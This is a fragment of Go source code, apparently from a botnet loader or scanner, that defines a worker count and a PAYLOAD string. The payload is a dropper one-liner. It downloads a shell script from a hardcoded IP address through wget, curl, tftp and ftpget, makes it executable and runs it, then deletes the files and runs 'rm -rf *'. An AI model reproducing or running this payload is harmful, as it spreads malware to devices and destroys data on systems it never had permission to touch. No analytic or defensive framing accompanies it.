...
const (
	...
	MAX_WORKERS       = 2000
	PAYLOAD           = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://103.20.102.84/sora.sh; curl -O http://103.20.102.84/sora.sh; chmod 777 sora.sh; sh sora.sh; tftp 103.20.102.84 -c get sora.sh; chmod 777 sora.sh; sh sora.sh; tftp -r sora2.sh -g 103.20.102.84; chmod 777 sora2.sh; sh sora2.sh; ftpget -v -u anonymous -p anonymous -P 21 103.20.102.84 sora1.sh sora1.sh; sh sora1.sh; rm -rf sora.sh sora2.sh sora1.sh; rm -rf *"
